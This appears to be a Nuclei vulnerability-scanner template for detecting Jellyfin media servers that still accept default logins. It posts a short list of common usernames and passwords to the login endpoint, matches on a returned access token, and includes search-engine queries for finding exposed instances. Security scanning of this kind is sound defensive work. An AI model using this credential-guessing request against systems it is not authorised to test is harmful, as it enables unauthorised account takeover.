id: jellyfin-default-login

info:
  name: Jellyfin Console - Default Login
  author: thefoggiest
  severity: high
  description: Jellyfin Console default login information was discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:jellyfin:jellyfin:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: jellyfin
    product: jellyfin
    shodan-query:
      - http.html:"jellyfin"
      - http.title:"jellyfin"
    fofa-query:
      - title="jellyfin"
      - body="jellyfin"
      - title="jellyfin" || body="http://jellyfin.media"
    google-query: intitle:"jellyfin"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)Jellyfin"})
  tags: default-login,jellyfin,misconfig

http:
  - raw:
      - |
        POST /Users/authenticatebyname HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-Emby-Authorization: MediaBrowser Client="Jellyfin Web", Device="Browser", DeviceId="DeviceID", Version="Version"

        {"Username":"{{username}}","Pw":"{{password}}"}

    payloads:
      username:
        - admin
        - administrator
        - jellyfin
      password:
        - admin
        - test
        - password
        - jellyfin
    attack: clusterbomb
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'User":{"Name'
          - '"LastLoginDate":'
          - 'AccessToken":'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200

